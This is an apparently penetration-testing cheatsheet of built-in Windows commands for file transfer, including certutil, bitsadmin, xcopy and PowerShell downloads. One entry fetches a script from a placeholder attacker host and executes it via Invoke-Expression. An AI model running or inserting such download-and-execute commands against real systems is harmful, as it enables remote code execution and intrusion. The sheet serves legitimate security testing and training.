---
id: bb5e4b78-2d77-4681-8b12-4446b5497662
name: Transferring Files with Windows
type: cheatsheet
verified: true
created_at: '2019-11-25T22:00:54.072213+00:00'
updated_at: '2023-05-30T20:13:18.502165+00:00'
---

# Transferring Files with Windows

**Status**: ✓ Verified

# Description

Windows built-in tools for transferring files to and from remote systems.





## Command Prompt (cmd.exe)





**Command** ([[Download from a Remote HTTP Server (certutil)]]):

```bash
certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" "$_PATH/$_FILENAME"
```









**Command** ([[Bitsadmin Download File from a Remote Web Server]]):

```bash
bitsadmin.exe /transfer "foo" /download http://$_REMOTE_IP/$_FILENAME C:\_$DEST_DIR\$_FILENAME
```



Note: Python2/3's web servers cannot be used to host files for bitsadmin transfers. Use Apache2 or Nginx instead.







**Command** ([[ xcopy Download Files from a Remote SMB]]):

```bash
xcopy \\$_REMOTE_IP\$_SHARE\$_FILENAME .
```









**Command** ([[ xcopy Upload Files to a Remote SMB]]):

```bash
xcopy $_FILENAME \\$_REMOTE_IP\$_SHARE
```





## PowerShell





**Command** ([[Download and Execute PowerShell Script (Invoke-Expression)]]):

```bash
Invoke-Expression (New-Object Net.WebClient).downloadString("http://$_ATTACKER_IP/$_FILENAME.ps1")
```









**Command** ([[Invoke-WebRequest Download a File from a Web Server]]):

```bash
Invoke-WebRequest -Uri http://$_REMOTE_IP/$_FILENAME -Outfile $_FILENAME
```









**Command** ([[Invoke-Expression Download a File from a Web Server]]):

```bash
(New-Object System.Net.WebClient).downloadfile("http://$_REMOTE_IP/$_FILENAME", "$_FULL_PATH/$_FILENAME")
```









**Command** ([[BitsTransfer Download a File from a Web Server]]):

```bash
Import-Module BitsTransfer
Start-BitsTransfer -Source http://$_REMOTE_IP/$_FILENAME -Destination $_FILENAME
```









**Command** ([[Mount a Windows SMB Share (PowerShell)]]):

```bash
New-PSDrive -Name "$_NAME" -PSProvider FileSystem -Credential $Cred -Root \\$_TARGET_IP\$_SHARE
```








